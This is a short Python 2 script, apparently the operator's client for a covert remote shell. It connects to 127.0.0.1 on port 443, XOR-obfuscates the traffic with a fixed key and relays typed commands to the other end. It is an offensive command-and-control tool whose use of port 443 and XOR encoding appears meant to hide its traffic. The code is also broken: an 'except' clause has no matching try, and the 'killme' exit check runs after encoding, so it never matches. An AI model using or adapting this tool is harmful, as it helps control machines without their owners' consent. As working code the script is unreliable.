#!/usr/bin/python

# shell client side

import os, sys
import socket
import subprocess

HOST = '127.0.0.1'
PORT = 443
pin = "XRTAAC"

def xor(string, key):
    data = ''
    for char in string:
        for ch in key:
            char = chr(ord(char) ^ ord(ch))
        data += char
    return data

socksize = 4096
conn = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    
try:
    conn.connect((HOST, PORT))
    print("[+] New connection established!")
    print("[+] Starting Intersecting shell....")
except:
    print("[!] Connection error!")
    sys.exit(2)

while True:
    data = conn.recv(socksize)
    data2 = xor(data, pin)
    #print data2
    print data2
    msg = raw_input()
    msg = xor(msg, pin)
    if msg == "killme":
        print("[!] Shutting down shell!")
        conn.close()
        sys.exit(0)
    else:
        conn.sendall(str(msg+"\n"))
except KeyboardInterrupt:
    print("[!] Exiting the shell!")


conn.close()

 	
